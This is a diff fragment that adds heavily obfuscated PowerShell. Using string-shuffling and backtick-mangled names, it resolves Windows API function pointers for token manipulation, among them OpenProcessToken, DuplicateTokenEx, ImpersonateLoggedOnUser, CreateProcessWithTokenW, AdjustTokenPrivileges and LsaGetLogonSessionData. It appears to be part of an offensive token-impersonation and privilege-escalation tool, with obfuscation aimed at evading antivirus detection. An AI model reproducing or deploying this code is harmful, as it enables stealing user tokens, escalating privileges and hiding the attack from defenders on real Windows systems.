+    ${TYP`ebu`Il`dEr} = ${MOD`ULeBu`i`l`deR}.("{0}{1}{2}"-f 'Define','T','ype').Invoke(("{2}{0}{1}{3}"-f'P','LICIT_AC','EX','CESS'), ${atTRi`B`UteS}, [System.ValueType])
+    ${t`yP`EbUILd`eR}.("{0}{2}{1}" -f 'D','d','efineFiel').Invoke(("{0}{3}{1}{2}{4}{5}"-f 'gr','c','cessPe','fA','rmission','s'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{2}{0}{1}"-f 't-N','ull','Ou')
+    ${T`y`pebUi`LdER}.("{2}{0}{1}"-f'efine','Field','D').Invoke(("{2}{1}{3}{0}"-f'ode','fAccess','gr','M'), [UInt32], ("{0}{1}" -f'Publ','ic')) | &("{0}{1}" -f 'Out-Nul','l')
+    ${typeB`U`ILd`ER}.("{2}{0}{3}{1}" -f 'neFi','d','Defi','el').Invoke(("{2}{1}{4}{0}{3}"-f'eritanc','rf','g','e','Inh'), [UInt32], ("{1}{2}{0}" -f 'c','Pub','li')) | &("{0}{1}" -f 'Out-N','ull')
+    ${Ty`PE`Builder}.("{1}{2}{0}"-f'ield','D','efineF').Invoke(("{1}{0}"-f'rustee','T'), ${Tru`sT`ee}, ("{1}{0}" -f'c','Publi')) | &("{0}{1}{2}"-f 'Out-','N','ull')
+    ${E`XPLiciT_`A`cCESS} = ${t`yPEb`UILD`er}.("{0}{2}{1}" -f 'Cr','ype','eateT').Invoke()
+    
+
+
+    
+    
+    
+    ${Op`E`NpROCeSSA`dDr} = &("{2}{3}{1}{0}" -f 'Address','oc','Get-','Pr') ("{1}{3}{0}{2}"-f'2.d','kerne','ll','l3') ("{1}{2}{0}"-f'ss','OpenPr','oce')
+	${OPENp`R`o`CE`sSDelE`GatE} = &("{1}{0}{2}{4}{3}"-f'et-D','G','e','Type','legate') @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	${oPeNp`Roc`ess} =   (&("{3}{0}{2}{1}"-f'ET','iablE','-VAR','G') ("kaJ"+"tE"))."V`ALue"::("{3}{5}{2}{4}{6}{7}{0}{1}" -f'te','r','legateFor','GetD','Fu','e','nctionPoi','n').Invoke(${oPE`NProcE`S`Saddr}, ${oPen`p`ROCE`ssd`eLe`GATe})
+
+    ${OpE`NPr`Oc`ESs`T`OKenaDDr} = &("{3}{0}{2}{1}" -f'et-Proc','dress','Ad','G') ("{2}{3}{0}{1}" -f'2.d','ll','advapi','3') ("{3}{2}{0}{1}"-f 'cessT','oken','ro','OpenP')
+	${o`pEnPro`CEsSTOkenDeL`E`GAte} = &("{3}{1}{4}{2}{0}"-f'pe','t-Dele','y','Ge','gateT') @([IntPtr], [UInt32],  $S2a.("{1}{2}{3}{0}"-f 'RefType','Mak','e','By').Invoke()) ([Bool])
+	${O`pEn`prOc`es`sTokEn} =  $kAJte::("{5}{3}{7}{8}{1}{0}{6}{2}{4}" -f 'Funct','eFor','nte','tDele','r','Ge','ionPoi','ga','t').Invoke(${OPen`PROCE`sst`oKen`Addr}, ${OpEn`pRoCeSsT`OkENdE`LEgA`Te})    
+
+    ${G`ETT`oken`INFOrm`At`ionaDDr} = &("{4}{1}{0}{2}{3}" -f'dr','rocAd','e','ss','Get-P') ("{3}{2}{1}{0}" -f'2.dll','3','api','adv') ("{3}{1}{2}{0}" -f 'ation','tToke','nInform','Ge')
+	${GE`TT`oK`EniN`ForMatiOndEL`Eg`Ate} = &("{3}{2}{1}{0}"-f'ateType','eg','-Del','Get') @([IntPtr], ${tOKe`N_`i`NF`ormaTIo`N_cL`Ass}, [IntPtr], [UInt32],   (&("{1}{0}" -f 'r','DI')  ('vA'+'RiABL'+'E:'+'3YxSN') )."v`ALuE".("{3}{0}{4}{2}{1}" -f 'eByRefT','e','p','Mak','y').Invoke()) ([Bool])
+	${gET`TokeNin`FORM`AtIon} =  (&("{2}{0}{1}{3}"-f '-','vaR','gEt','Iable')  kajte  )."Va`luE"::("{1}{4}{0}{3}{5}{2}{6}"-f'un','GetDelegat','oin','ction','eForF','P','ter').Invoke(${GET`TOKeninfor`mAT`i`onA`dDR}, ${gETT`oken`I`NF`ormAtionDelEGATe})    
+
+    ${S`EtTHReaDtOkE`N`AdDR} = &("{2}{4}{1}{3}{0}" -f 'ss','r','Get-Pr','e','ocAdd') ("{0}{1}{3}{2}"-f 'ad','v','2.dll','api3') ("{2}{0}{3}{1}"-f'e','adToken','S','tThre')
+	${s`et`THreA`Dt`o`kE`NDelE`gatE} = &("{3}{0}{1}{2}"-f'a','teT','ype','Get-Deleg') @([IntPtr], [IntPtr]) ([Bool])
+	${SEtTh`Re`ADT`oKeN} =   $kajTE::("{8}{1}{5}{4}{2}{7}{3}{6}{0}" -f 'nter','etDel','rFun','tion','ateFo','eg','Poi','c','G').Invoke(${SE`TtH`Re`AdToKEN`A`ddR}, ${sETt`hr`eADTOkE`NDE`leGaTE})    
+
+    ${iMpersO`NaTE`l`OGG`EdOn`US`eRaDDR} = &("{1}{2}{3}{0}{4}"-f 'cAd','G','et-P','ro','dress') ("{0}{1}{3}{2}"-f'advapi32.','d','l','l') ("{5}{2}{4}{3}{0}{1}"-f'ogge','dOnUser','m','onateL','pers','I')
+	${Im`pe`RsO`Nate`LoGgEdOn`U`SeRDEL`E`gatE} = &("{4}{0}{2}{3}{1}"-f 't-Deleg','pe','ate','Ty','Ge') @([IntPtr]) ([Bool])
+	${iMPerSoN`ATELO`GgE`dOnU`S`eR} =  (&("{0}{1}{2}" -f 'va','r','iAblE') ("KajT"+"E") )."v`ALUE"::("{6}{5}{1}{0}{4}{3}{2}" -f 'ctionP','ForFun','er','int','o','gate','GetDele').Invoke(${iMPersONA`T`elO`GGED`ONUs`EraDDR}, ${Im`PeRSON`AT`ELog`G`edo`NUsE`RDEl`EgA`TE})
+
+    ${reVer`TtoseL`F`A`DDr} = &("{1}{4}{0}{2}{3}"-f'-','Ge','ProcAd','dress','t') ("{3}{1}{2}{0}" -f'dll','dv','api32.','a') ("{2}{0}{1}" -f'tToSel','f','Rever')
+	${R`Ev`eR`TtO`sEl`Fd`ELegATe} = &("{3}{1}{2}{0}"-f'eType','Deleg','at','Get-') @() ([Bool])
+	${re`VERt`ToSE`Lf} =  $kAjTE::("{8}{6}{5}{3}{7}{1}{4}{0}{2}"-f'i','ti','nter','egateForFun','onPo','l','etDe','c','G').Invoke(${re`VE`R`TtOSElFA`ddR}, ${REVer`T`TOsEl`F`DE`lEGatE})
+
+    ${l`sAGetlogOnS`ESS`Io`NDaTa`A`DdR} = &("{2}{3}{0}{1}"-f'dres','s','Get-Pr','ocAd') ("{2}{0}{1}" -f '2.dl','l','secur3') ("{4}{3}{5}{1}{0}{2}"-f'at','ogonSessionD','a','saGet','L','L')
+	${Ls`AgETl`O`Go`NsesS`IoNdaT`A`DeLEGa`TE} = &("{2}{0}{3}{1}"-f 'et','ateType','G','-Deleg') @([IntPtr],  $s2a.("{2}{0}{1}"-f'akeByRefT','ype','M').Invoke()) ([UInt32])
+	${LsaGeTlo`gOnSess`I`O`NDatA} =   (&("{0}{1}{2}" -f'ch','I','LdItEM')  variaBLE:KAJTe )."VA`lUE"::("{4}{2}{5}{1}{0}{3}"-f'P','nction','Deleg','ointer','Get','ateForFu').Invoke(${l`S`AGetlogo`N`SeSsI`O`ND`AtaADDr}, ${lSAG`etLOgOnsesS`ION`DatA`Dele`GaTe})
+
+    ${cR`eATeProc`e`sSWIThT`OKen`Waddr} = &("{2}{0}{1}"-f 'et-ProcAdd','ress','G') ("{0}{3}{2}{1}"-f 'ad','pi32.dll','a','v') ("{3}{5}{2}{4}{6}{1}{0}"-f'W','oken','ePr','Cre','ocessWit','at','hT')
+	${c`RE`AtEp`RoCe`s`s`Wit`HtOKeNw`de`lEgAte} = &("{0}{4}{1}{2}{3}" -f 'G','l','ega','teType','et-De') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
+	${C`R`EAtEpro`ce`SsWith`To`KE`NW} =  $Kajte::("{2}{0}{3}{4}{1}{5}" -f'leg','t','GetDe','ateFor','Func','ionPointer').Invoke(${cRe`At`epROceSSWitHtOK`ENwad`Dr}, ${CREAT`Ep`R`o`C`es`sWi`THtoKE`NWDel`EgAtE})
+
+    ${meMSeT`AD`Dr} = &("{2}{1}{0}{3}"-f 'dr','ProcAd','Get-','ess') ("{0}{3}{1}{2}"-f'msv','t.d','ll','cr') ("{1}{0}"-f 'set','mem')
+	${M`e`MS`eTdELegA`Te} = &("{4}{1}{2}{0}{3}" -f 'legat','et-','De','eType','G') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+	${ME`MSet} =  (  &('lS') ("vArIABL"+"e:k"+"AJte"))."Va`LUe"::("{2}{0}{1}{5}{6}{4}{3}" -f'e','tDelegateF','G','nter','i','orFunctio','nPo').Invoke(${mEmSEt`A`D`Dr}, ${MemSe`TDEle`GaTe})
+
+    ${d`UPLICat`e`TOkenExAD`DR} = &("{3}{4}{2}{0}{1}" -f 'd','ress','d','Get-Proc','A') ("{0}{2}{3}{1}" -f 'a','.dll','dvapi3','2') ("{0}{2}{4}{1}{3}" -f'Dupl','en','icateTo','Ex','k')
+	${DUP`LI`CA`T`Etokenex`dELega`Te} = &("{3}{0}{1}{2}" -f 'ga','teTy','pe','Get-Dele') @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32],  $s2A.("{2}{0}{4}{1}{3}" -f 'eBy','Typ','Mak','e','Ref').Invoke()) ([Bool])
+	${d`Up`LICatETO`KE`N`eX} =   $KAJTE::("{2}{5}{3}{4}{1}{0}{6}{7}" -f 'nPo','eForFunctio','Get','e','legat','D','i','nter').Invoke(${DUP`LIcaTe`T`o`keN`ex`ADDR}, ${du`PLIcA`TEtOkE`Ne`xdEleg`AtE})
+
+    ${Lo`oKU`PAc`COU`NT`S`idwAddr} = &("{2}{0}{3}{1}"-f 't-Proc','ddress','Ge','A') ("{1}{2}{3}{0}" -f 'l','a','dvap','i32.dl') ("{5}{0}{2}{3}{1}{4}"-f 'o','ccou','o','kupA','ntSidW','L')
+	${LoOKuPa`cCOun`TsIdWd`eLeGa`TE} = &("{2}{4}{3}{1}{0}"-f 'Type','e','G','t-Delegat','e') @([IntPtr], [IntPtr], [IntPtr],  (  &("{2}{1}{0}" -f'rIABle','a','V') 3yXSN)."VAl`UE".("{2}{1}{0}"-f 'yRefType','keB','Ma').Invoke(), [IntPtr],  (&("{2}{1}{3}{0}"-f 'AbLE','Et-','g','VARi')  ("3yXS"+"n")  )."Va`LUe".("{1}{0}{2}"-f 'ByRefTy','Make','pe').Invoke(),   (  &("{0}{1}{2}{3}"-f'ge','T-','vari','AbLE')  ("3yxs"+"n") -vA).("{0}{1}{2}" -f 'M','akeByRef','Type').Invoke()) ([Bool])
+	${lOOKUP`AcC`OUn`T`sidw} =  (  &('GI') varIAbLe:kAjTE)."vAl`Ue"::("{5}{3}{7}{4}{6}{2}{0}{1}"-f 'ointe','r','nP','te','rFunc','GetDelega','tio','Fo').Invoke(${lOok`UP`AcC`Ou`NtsidWaD`dR}, ${lo`OkuPaccOuNTsIDWd`E`L`Eg`ATe})
+
+    ${CL`oS`EhaNDL`eA`ddr} = &("{0}{2}{1}{3}" -f'Get-ProcAd','es','dr','s') ("{1}{2}{0}"-f'2.dll','ker','nel3') ("{1}{3}{2}{0}" -f'e','C','ndl','loseHa')
+	${c`loS`eh`AnD`lEDElegAtE} = &("{2}{0}{3}{4}{1}"-f 'e','teType','G','t-Del','ega') @([IntPtr]) ([Bool])
+	${cl`ose`hAN`dlE} =   (  &("{0}{1}"-f'ITE','m')  ('V'+'A'+'riAbLe:'+'KaJTE') )."V`Alue"::("{0}{5}{2}{4}{3}{1}" -f'Ge','inter','ateFor','onPo','Functi','tDeleg').Invoke(${cLo`SEha`N`Dl`eaDDr}, ${cl`o`sEhA`NdlEDe`LegATe})
+
+    ${ls`Af`R`eER`ETUrnbuFFe`R`AddR} = &("{3}{1}{0}{2}"-f 're','t-ProcAdd','ss','Ge') ("{1}{3}{2}{0}"-f'l','secu','2.dl','r3') ("{6}{4}{2}{5}{0}{3}{1}" -f 'rnB','ffer','Ret','u','ee','u','LsaFr')
+	${L`SAF`REeRe`TUrNBUFf`e`R`DE`lEgate} = &("{1}{0}{3}{2}"-f't-Delegate','Ge','e','Typ') @([IntPtr]) ([UInt32])
+	${L`sAFRe`er`ETUrn`BuffEr} =   (&("{2}{3}{0}{1}" -f'-chi','LdITem','g','Et')  VaRiaBle:kajTE)."v`AlUe"::("{5}{6}{2}{7}{8}{3}{1}{4}{0}" -f 'er','n','ateForF','io','Point','GetDe','leg','u','nct').Invoke(${L`SAF`REERe`T`Ur`NB`UfF`ErADDr}, ${LSAfrEeret`U`Rnbu`F`FerdeLE`GA`Te})
+
+    ${opent`h`ReAdAD`DR} = &("{0}{1}{2}{3}" -f'Get-','Proc','Addr','ess') ("{1}{0}{2}" -f 'l32','kerne','.dll') ("{2}{1}{0}" -f'read','penTh','O')
+	${oP`EN`TH`ReADdE`LegAtE} = &("{0}{2}{4}{3}{1}"-f 'G','eType','et','t','-Delega') @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	${Op`en`TH`ReAd} =   $KAJTe::("{4}{6}{3}{1}{0}{2}{7}{5}{8}" -f'ti','eForFunc','o','egat','G','ointe','etDel','nP','r').Invoke(${OP`eNTh`R`Ead`AdDr}, ${oPen`T`HrEADDELEG`ATe})
+
+    ${OPEN`Thr`EaDTOKEn`A`DDR} = &("{1}{2}{0}{3}"-f'rocAddre','Ge','t-P','ss') ("{0}{2}{1}" -f 'advap','l','i32.dl') ("{2}{1}{0}" -f 'Token','ead','OpenThr')
+	${o`Pe`NtHrEadt`O`ken`DELEGAtE} = &("{1}{4}{0}{5}{2}{3}"-f'e','Get','T','ype','-Del','gate') @([IntPtr], [UInt32], [Bool],  ( &("{2}{1}{0}"-f'teM','ILdi','CH')  ('vAR'+'IABlE:'+'s2'+'a'))."V`AlUe".("{0}{1}{2}" -f'Make','ByRe','fType').Invoke()) ([Bool])
+	${O`PENT`H`READTo`kEN} =   (&("{2}{0}{1}" -f'aria','blE','GET-V') ('kaJ'+'tE')  )."V`ALue"::("{6}{3}{7}{4}{0}{5}{1}{2}" -f'ction','nte','r','etDe','ateForFun','Poi','G','leg').Invoke(${OPENtH`R`EAdtOKe`N`AdDR}, ${o`pEntH`Re`AdtoKe`NDeLEg`AtE})
+
+    ${Cre`AtEp`ROCEssA`SuSER`WAdDr} = &("{0}{1}{3}{4}{2}"-f'Get-','Pr','ddress','oc','A') ("{0}{1}{3}{2}" -f 'advapi3','2','ll','.d') ("{2}{5}{0}{1}{3}{4}" -f'ePr','o','C','cessAsUser','W','reat')
+	${Crea`T`EpR`oCes`saS`Use`RWdELEgAtE} = &("{2}{3}{0}{1}"-f'elegateT','ype','Get','-D') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
+	${cREatE`PRoceSSA`suse`RW} =  ( &("{2}{0}{1}"-f't','-vARIabLE','Ge') KajtE  -VaL)::("{5}{4}{0}{7}{8}{2}{1}{6}{3}"-f 'l','on','ncti','inter','e','GetD','Po','egateFor','Fu').Invoke(${cR`eaTeP`ROcESsA`suSE`RWadDR}, ${C`R`eat`Epr`ocESSasuSErWD`eLEgatE})
+
+    ${oPe`NWi`Nd`OwstatiONwA`DdR} = &("{1}{2}{3}{0}{4}" -f'r','G','et-ProcAd','d','ess') ("{2}{0}{1}"-f'ser','32.dll','u') ("{1}{4}{0}{2}{3}"-f'WindowSt','Ope','at','ionW','n')
+    ${op`E`NWINd`OWS`Tat`iOn`WdELegATE} = &("{0}{3}{4}{2}{1}"-f 'Ge','teType','a','t-D','eleg') @([IntPtr], [Bool], [UInt32]) ([IntPtr])
+    ${O`pen`wi`NdOWsT`A`TIONW} =   (&("{2}{1}{0}" -f 'ble','-varIA','GET')  kAjTE)."v`AlUE"::("{0}{6}{7}{3}{2}{1}{4}{5}"-f 'Get','teForFunc','a','g','t','ionPointer','De','le').Invoke(${open`WINdo`wST`ATI`On`wA`dDr}, ${O`pEnw`iNdo`wS`TaTio`NWDe`lEg`Ate})
+
+    ${OPen`de`S`k`TOPAadDr} = &("{2}{3}{4}{0}{1}"-f'rocAddr','ess','Ge','t','-P') ("{2}{0}{1}" -f'er','32.dll','us') ("{0}{2}{3}{1}" -f'Open','topA','Des','k')
+    ${O`peN`desK`T`OpA`D`ELEgatE} = &("{3}{2}{1}{0}" -f 'legateType','De','t-','Ge') @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
+    ${oPenDE`S`kt`oPA} =  (&("{2}{0}{3}{4}{1}" -f't-','diTEm','Ge','cH','il')  ('VAriaBl'+'e'+':'+'kAJT'+'e'))."vAL`UE"::("{1}{7}{0}{3}{8}{2}{5}{6}{4}" -f 'or','G','ctionP','Fu','er','o','int','etDelegateF','n').Invoke(${OpE`ND`eSkto`pAAdDr}, ${o`p`EN`de`sk`TOPAdElEGATE})
+
+    ${i`mPE`RsonATes`eLF`A`DdR} = &("{4}{2}{1}{3}{0}" -f'ddress','t-Pr','e','ocA','G') ("{0}{1}{3}{2}"-f 'Advap','i','l','32.dl') ("{4}{1}{0}{2}{3}" -f 'onateSe','rs','l','f','Impe')
+    ${I`M`persONa`Te`SELfdelE`G`ATe} = &("{3}{2}{1}{0}" -f 'e','p','et-DelegateTy','G') @([Int32]) ([Bool])
+    ${Im`Pers`ona`Tes`Elf} =  $kAJTE::("{7}{5}{1}{2}{8}{4}{6}{0}{3}"-f 'e','r','Functi','r','Poi','teFo','nt','GetDelega','on').Invoke(${IM`PErSoN`ATe`s`e`l`Faddr}, ${impErso`NA`Tes`ELFDELEg`AtE})
+
+    ${LO`OkuP`pRI`ViLege`VaLUeAdDr} = &("{3}{1}{2}{4}{0}" -f 'ss','o','cAd','Get-Pr','dre') ("{2}{1}{3}{0}" -f '.dll','vapi3','Ad','2') ("{2}{1}{5}{3}{4}{0}" -f 'ueA','kupP','Loo','ivileg','eVal','r')
+    ${l`OokuPp`Ri`VilEGEVa`l`U`e`dEL`EGate} = &("{2}{4}{3}{1}{0}" -f 'egateType','l','G','De','et-') @([String], [String], ${l`UiD}.("{0}{1}{2}"-f 'Mak','eByRef','Type').Invoke()) ([Bool])
+    ${L`OOKupp`RIvileGEv`AlUE} =   (&("{2}{0}{1}"-f 'Ari','abLE','v') ("KaJ"+"te")  -vA )::("{8}{5}{1}{2}{7}{6}{3}{4}{0}"-f 'r','legateForFun','ct','i','nte','e','onPo','i','GetD').Invoke(${l`OokuPPrIV`iLEg`E`ValUeAdDR}, ${l`o`o`KuPprIvI`LeGE`Va`LuED`ELEGAtE})
+
+    ${ad`jUS`TtO`kEnPRiVi`LE`gE`SAddr} = &("{0}{2}{1}" -f'Get','ress','-ProcAdd') ("{1}{3}{0}{2}" -f'pi32','Ad','.dll','va') ("{1}{4}{0}{2}{3}" -f'Pri','AdjustT','vileg','es','oken')
+    ${AdJ`USTtO`K`Enpr`IV`i`Le`geSDe`LEgATE} = &("{1}{0}{2}{4}{3}" -f'ega','Get-Del','t','pe','eTy') @([IntPtr], [Bool], ${ToK`eN_pRI`VI`LE`GES}.("{2}{3}{1}{0}" -f 'e','fTyp','Make','ByRe').Invoke(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
+    ${a`dJU`sTToKENprIVIl`e`GeS} =   ( &("{1}{0}"-f 'M','Ite') VARIablE:kaJTE  )."v`Alue"::("{1}{0}{8}{3}{4}{5}{7}{2}{6}" -f 'e','GetDelegat','int','rF','un','ction','er','Po','Fo').Invoke(${aDju`STT`oKEN`pRiVIlEGES`Ad`Dr}, ${ADJu`STTok`eNpr`I`VIlE`g`EsD`el`eG`AtE})
+
+    ${GETc`Ur`REnT`ThR`EaDAddr} = &("{1}{0}{3}{2}"-f 'ocAddr','Get-Pr','ss','e') ("{3}{1}{2}{0}" -f'l','ernel32.','dl','k') ("{0}{1}{2}{3}" -f'G','et','CurrentThr','ead')
+    ${g`eTCU`RRenTT`HreADDelE`GA`TE} = &("{2}{0}{3}{1}" -f 'et-D','e','G','elegateTyp') @() ([IntPtr])
+    ${GetCurREnt`Thr`E`Ad} =   ( &("{0}{1}" -f'ChI','LdiTEm')  ('VARiAbLe:ka'+'jT'+'E'))."VA`luE"::("{1}{0}{6}{7}{2}{4}{5}{8}{3}"-f'e','G','ateForFuncti','r','onPoi','n','tDele','g','te').Invoke(${GeT`C`URreNtThREadA`D`dR}, ${GET`CuR`R`e`NTT`hREADD`eLeG`ATe})
+
+    ${G`etSECU`RItyIN`FOADDr} = &("{4}{0}{2}{1}{3}"-f 'et-Pro','A','c','ddress','G') ("{1}{3}{0}{2}" -f 'l','advap','l','i32.d') ("{2}{0}{1}"-f 'yInf','o','GetSecurit')
+    ${G`ET`SECU`RIt`Yi`NFOdELe`GaTe} = &("{3}{0}{2}{1}"-f 't-D','teType','elega','Ge') @([IntPtr], [UInt32], [UInt32],  ( &("{2}{0}{1}"-f 'ARIa','Ble','v')  S2A)."VAl`Ue".("{3}{1}{0}{2}"-f 'eByRefT','ak','ype','M').Invoke(),  (  &('gi')  ('v'+'aria'+'BLe:S2'+'A'))."v`ALue".("{0}{2}{1}{3}" -f'Mak','yRefT','eB','ype').Invoke(),   (  &("{0}{2}{1}" -f'C','DiTeM','hIL') ('va'+'riA'+'Ble:s2a') )."v`ALue".("{1}{2}{3}{4}{0}" -f 'pe','Ma','ke','ByRefT','y').Invoke(),   $s2a.("{0}{1}{2}{3}" -f 'M','a','keByRefT','ype').Invoke(),   (&("{0}{1}{2}" -f'cHi','ldite','M')  ("VAr"+"iaB"+"l"+"E:S2a")  )."va`lue".("{0}{1}{2}{3}" -f 'Make','ByRefTy','p','e').Invoke()) ([UInt32])
+    ${G`EtSEcu`RIT`Y`I`NFO} =   (&('ls')  ('Va'+'RIaBLe:k'+'a'+'j'+'tE') )."V`ALUe"::("{2}{5}{0}{4}{1}{3}"-f 'ateForF','ionPo','GetDel','inter','unct','eg').Invoke(${G`ETSEc`UR`ityiN`Fo`Addr}, ${gets`e`cURI`Ty`INfoD`eleGaTE})
+
+    ${setsec`UR`ItYinFoa`DDR} = &("{3}{2}{1}{0}"-f'ss','dre','cAd','Get-Pro') ("{3}{2}{0}{1}" -f 'pi32.dl','l','va','ad') ("{4}{3}{2}{0}{1}" -f 'n','fo','yI','tSecurit','Se')
+    ${s`ETsE`CURItYin`FoD`eLEGATe} = &("{4}{2}{0}{3}{1}"-f 'l','gateType','e','e','Get-D') @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
+    ${s`ETsEcu`RiT`yi`Nfo} =  $kajTE::("{0}{2}{5}{1}{4}{3}" -f 'Ge','teF','tDele','ctionPointer','orFun','ga').Invoke(${sets`eCuRi`Tyin`Fo`AddR}, ${SeT`sE`Cu`Ri`TYiNfO`De`lEG`ATE})
+
+    ${G`EtaC`E`ADDR} = &("{1}{0}{3}{2}"-f'Ad','Get-Proc','ress','d') ("{1}{0}{3}{2}"-f'dvapi3','a','.dll','2') ("{1}{0}" -f 'tAce','Ge')
+    ${gEt`AC`e`Dele`gaTe} = &("{1}{2}{0}{3}" -f '-DelegateTy','G','et','pe') @([IntPtr], [UInt32],   $s2a.("{2}{0}{1}"-f 'By','RefType','Make').Invoke()) ([IntPtr])
+    ${g`EtA`CE} =   (&("{0}{2}{1}"-f 'gEt-va','E','rIABl')  ('Ka'+'JTe')  -VAL)::("{3}{4}{5}{6}{0}{1}{2}"-f'Fun','ctionPoi','nter','GetD','el','egat','eFor').Invoke(${G`EtAcE`ADDr}, ${g`etA`Ce`DeleGa`TE})
+
+    ${loo`KUPa`cCo`Un`TsIDWaDDr} = &("{0}{1}{2}{3}{4}"-f 'Ge','t-P','roc','Ad','dress') ("{0}{2}{1}"-f 'ad','32.dll','vapi') ("{3}{4}{1}{2}{0}" -f'dW','Accou','ntSi','L','ookup')
+    ${l`oO`kUpACC`oUnT`SiD`Wd`ElEg`A`Te} = &("{2}{1}{4}{0}{3}" -f'yp','eg','Get-Del','e','ateT') @([IntPtr], [IntPtr], [IntPtr],   (&("{0}{1}{2}" -f 'gET-Va','riA','bLe') ("3Yx"+"sN") )."val`UE".("{1}{0}{2}"-f 'a','M','keByRefType').Invoke(), [IntPtr],  (  &("{0}{1}" -f 'D','Ir')  vARiABlE:3yxSn  )."v`ALue".("{2}{3}{1}{4}{0}" -f 'e','efT','MakeBy','R','yp').Invoke(),   ( &("{2}{1}{0}" -f 'e','IabL','gEt-var') 3Yxsn  )."va`LuE".("{2}{1}{3}{0}" -f 'pe','akeBy','M','RefTy').Invoke()) ([Bool])
+    ${LO`oKUpaccOun`TS`IdW} =  $KaJtE::("{4}{1}{3}{2}{0}{5}"-f 'o','etDeleg','orFunctionP','ateF','G','inter').Invoke(${l`oO`kuPa`Cc`OUNtsIdw`AdDR}, ${LOokUp`A`cCoUnTs`idW`D`EL`e`G`ATe})
+
+    ${AdD`AccEsSa`LLO`weDAC`E`A`DDr} = &("{3}{1}{2}{4}{0}" -f 'ss','Ad','d','Get-Proc','re') ("{1}{2}{0}"-f 'pi32.dll','adv','a') ("{2}{4}{0}{3}{1}"-f 'llowe','Ace','A','d','ddAccessA')
+    ${a`DDacCeSs`Al`LOwEd`AC`eDEleGATE} = &("{4}{0}{3}{2}{1}" -f't','Type','ate','-Deleg','Ge') @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
+    ${Add`A`CCESSa`Llow`EDACE} =   (  &("{1}{0}{2}"-f'bl','vaRIa','e')  ('kaj'+'tE'))."V`AluE"::("{2}{1}{3}{0}{4}{5}"-f 'gateForFunc','De','Get','le','tion','Pointer').Invoke(${a`DdAc`cessAl`lOwEDA`CE`A`DdR}, ${AddaccEsS`A`ll`oW`ED`AcE`dEL`egATe})
+
+    ${cR`EaTewelL`knO`wnS`iDadDr} = &("{0}{2}{1}{3}" -f 'G','-Pr','et','ocAddress') ("{3}{2}{0}{1}"-f'i32.','dll','ap','adv') ("{1}{2}{3}{0}"-f 'd','Crea','teWel','lKnownSi')
+    ${Cre`ATEwEl`lK`NOWnSiDDElE`G`ATE} = &("{4}{0}{1}{2}{3}" -f'e','gat','eTyp','e','Get-Del') @([UInt32], [IntPtr], [IntPtr],  (  &("{2}{0}{1}" -f'rI','ablE','va') 3YxsN)."va`Lue".("{3}{2}{0}{1}" -f'ByRefTy','pe','e','Mak').Invoke()) ([Bool])
+    ${Cr`E`A`TeWE`LL`KNownS`ID} =  (  &("{3}{4}{0}{1}{2}"-f'-CHild','itE','m','G','eT')  variablE:KAJTE  )."VA`LuE"::("{3}{4}{1}{2}{0}"-f'ter','ForFun','ctionPoin','GetDelega','te').Invoke(${crEA`TeWel`lKNoW`NsI`d`AD`dR}, ${cREAtEwellkN`O`wNSi`dD`ElEGate})
+
+    ${sETen`TRI`Esin`AcL`wAdDr} = &("{3}{0}{1}{2}" -f 'e','t-ProcAddres','s','G') ("{0}{2}{1}"-f 'adv','l','api32.dl') ("{0}{2}{4}{3}{1}"-f'S','W','etEn','esInAcl','tri')
+    ${S`etENtrIeSI`Na`ClwDEleG`ATE} = &("{0}{1}{2}{3}{4}"-f 'Get-','D','elega','teT','ype') @([UInt32], ${expli`C`iT_`A`CcesS}.("{3}{0}{2}{1}" -f 'f','ype','T','MakeByRe').Invoke(), [IntPtr],  ( &("{1}{3}{0}{2}"-f'vaRIAb','g','lE','ET-')  s2A )."vAL`UE".("{1}{0}{2}" -f 'akeByRefT','M','ype').Invoke()) ([UInt32])
+    ${SEtE`N`TR`IesinA`C`LW} =  (  &("{1}{0}{2}" -f 'D','ChIl','Item')  varIable:kAjtE)."vA`lUe"::("{2}{0}{1}{3}{4}{5}" -f'tDe','legateFo','Ge','rF','unctionPoin','ter').Invoke(${SE`Te`NtRI`e`si`NaclWA`DdR}, ${SetE`NTRie`sInac`lWdE`le`G`A`TE})
+
+    ${lo`CAlfREeA`DDR} = &("{0}{1}{2}{3}" -f'Ge','t-','ProcAddres','s') ("{2}{0}{1}"-f '32.d','ll','kernel') ("{0}{1}{2}" -f 'Lo','calFr','ee')
+    ${LO`Ca`Lf`R`eEDelEgatE} = &("{4}{3}{2}{0}{1}"-f'legateTyp','e','e','t-D','Ge') @([IntPtr]) ([IntPtr])
+    ${LOcAL`F`REE} =   (&("{2}{1}{0}" -f 'E','eT-VarIAbL','G') ("KA"+"jTe") -valuE)::("{4}{6}{8}{3}{1}{7}{0}{5}{2}" -f'tion','F','nter','egate','G','Poi','etDe','orFunc','l').Invoke(${lOc`A`lFr`eEaD`dR}, ${loCaL`Fr`EEDEl`e`ga`Te})
+
+    ${LO`OKU`PPriVilEgEN`AM`Ew`AdDr} = &("{2}{1}{0}{3}" -f'ddr','ocA','Get-Pr','ess') ("{0}{1}{2}" -f 'adva','pi32','.dll') ("{5}{4}{1}{2}{0}{3}{6}"-f 'N','v','ilege','ame','kupPri','Loo','W')
+    ${Loo`kU`PP`RIvil`egenAmeW`D`elE`GA`Te} = &("{0}{2}{4}{1}{3}" -f 'G','DelegateT','et','ype','-') @([IntPtr], [IntPtr], [IntPtr],   (  &('GI')  vARIabLe:3Yxsn  )."VaL`UE".("{2}{1}{0}"-f'keByRefType','a','M').Invoke()) ([Bool])
